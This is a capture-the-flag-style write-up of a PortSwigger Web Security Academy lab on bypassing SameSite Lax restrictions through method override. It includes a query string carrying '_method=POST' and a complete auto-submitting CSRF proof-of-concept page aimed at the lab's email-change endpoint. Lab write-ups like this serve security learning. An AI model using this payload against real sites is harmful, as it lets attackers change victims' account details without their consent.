![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/6841e57a-c57a-4f55-96a5-bbee5c096463)

### Solution

Go to My-Account and Log In to the account with the above credentials and change your email address.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/ae5e217c-2296-4b5e-9198-91a022c07563)

Send the POST /my-account/change-email request to Burp Repeater.And Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens so may be vulnerable to CSRF if you can bypass the SameSite cookie restrictions.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/001adbcc-062c-4818-bc7f-90f0d27e2171)

Look at the response to your POST /login request. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/f1d4a2e4-0182-449b-bdce-a2b10d0e2181)

tried changing the request from POST to GET but it was not successful

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/c10929cb-47e5-4d19-8faf-868e5ea7f517)

Try overriding the method by adding the _method parameter to the query string:

```js
/my-account/change-email?email=foo%40web-security-academy.net&_method=POST
```

Send the request. Observe that this has been accepted by the server.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/fe19dac6-31d7-4064-b57d-7a7869fd4e84)

generating csrf poc

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/e270efa4-f3a4-4d02-b4da-d1570b59d9e8)


payload

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0abc00f1030ce1af82f01f6000cb00b6.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="foo&#64;web&#45;security&#45;academy&#46;net" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Store and view the exploit yourself.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/72e6a30c-7d60-41cc-b538-c80efe2c8b38)

click deliver and solve the lab

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/3ec81ff0-8156-465c-bb16-7ff1f826b218)

